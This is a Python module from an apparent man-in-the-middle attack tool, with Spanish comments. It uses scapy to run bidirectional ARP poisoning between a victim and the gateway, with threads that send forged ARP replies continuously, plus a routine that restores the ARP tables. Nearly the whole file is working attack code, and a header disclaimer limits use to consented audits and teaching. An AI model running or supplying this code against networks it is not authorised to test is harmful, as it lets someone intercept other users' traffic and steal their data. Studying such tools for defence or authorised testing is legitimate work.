# =============================================================================
# Autor        : (SysMho)
# Módulo       : arp_utils.py
# Descripción  : Control directo sobre tablas ARP para realizar ataques tipo MITM.
#
# Funcionalidad:
#   - Envenenamiento ARP bidireccional entre la víctima y la gateway.
#   - Restauración de las tablas ARP originales al terminar la sesión.
#   - Uso de hilos para mantener el ataque activo constantemente.
#
# Nota legal     : Esta herramienta está diseñada para pruebas controladas,
#                  fines educativos o auditorías con consentimiento explícito.
# =============================================================================

import time
import threading
from scapy.all import ARP, Ether, send, sendp, srp
import network_utils
import ui_utils

# Control global de hilos y señal de parada
arpspoof_processes = []
stop_attack = threading.Event()


# Resuelve la dirección MAC de la IP destino mediante ARP.

def get_mac(ip):
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2, retry=2,
        iface=network_utils.interface,
        verbose=0
    )
    for _, rcv in ans:
        return rcv[Ether].src
    return None


# Restaura las tablas ARP reales entre víctima y gateway.

def restore_arp():
    print("[*] Restaurando tablas ARP...")
    victim_mac = get_mac(network_utils.ip_victima)
    gateway_mac = get_mac(network_utils.ip_gateway)

    if not victim_mac or not gateway_mac:
        print(ui_utils.BOLD_RED + "[✘] No se pudieron resolver las MAC reales antes de restaurar." + ui_utils.NC)
        return

    for i in range(10):
        print(f"{ui_utils.GREY}[→] Intento {i+1} de restaurar ARP...{ui_utils.NC}")
        send(ARP(op=2, pdst=network_utils.ip_victima, psrc=network_utils.ip_gateway, hwsrc=gateway_mac),
             iface=network_utils.interface, verbose=0)
        send(ARP(op=2, pdst=network_utils.ip_gateway, psrc=network_utils.ip_victima, hwsrc=victim_mac),
             iface=network_utils.interface, verbose=0)
        time.sleep(0.3)

    print(ui_utils.BOLD_GREEN + "[✔] Tablas ARP restauradas correctamente (o al menos intentado)." + ui_utils.NC)


# Hilo que envía paquetes ARP falsificados continuamente.

def arpspoof_thread(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(ui_utils.BOLD_RED + f"[✘] No se pudo resolver la MAC de {target_ip}." + ui_utils.NC)
        return

    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=spoof_ip)

    while not stop_attack.is_set():
        sendp(pkt, iface=network_utils.interface, verbose=0)
        time.sleep(2)


# Inicia el envenenamiento de la víctima.

def spoof_objetivo():
    print("[*] Preparando envenenamiento ARP al objetivo.")
    ui_utils.loading_bar("Posicionando sobre la víctima", "Objetivo localizado")
    thread = threading.Thread(target=arpspoof_thread, args=(network_utils.ip_victima, network_utils.ip_gateway))
    thread.start()
    arpspoof_processes.append(thread)
    print(ui_utils.BOLD_GREEN + "[✓] Tabla ARP del objetivo manipulada.\n" + ui_utils.NC)


# Inicia el envenenamiento de la gateway.

def spoof_gateway():
    print("[*] Preparando envenenamiento ARP para la Gateway.")
    ui_utils.loading_bar("Accediendo al enlace Gateway", "Router identificado")
    thread = threading.Thread(target=arpspoof_thread, args=(network_utils.ip_gateway, network_utils.ip_victima))
    thread.start()
    arpspoof_processes.append(thread)
    print(ui_utils.BOLD_GREEN + "[✓] Tabla ARP de la gateway manipulada.\n" + ui_utils.NC)
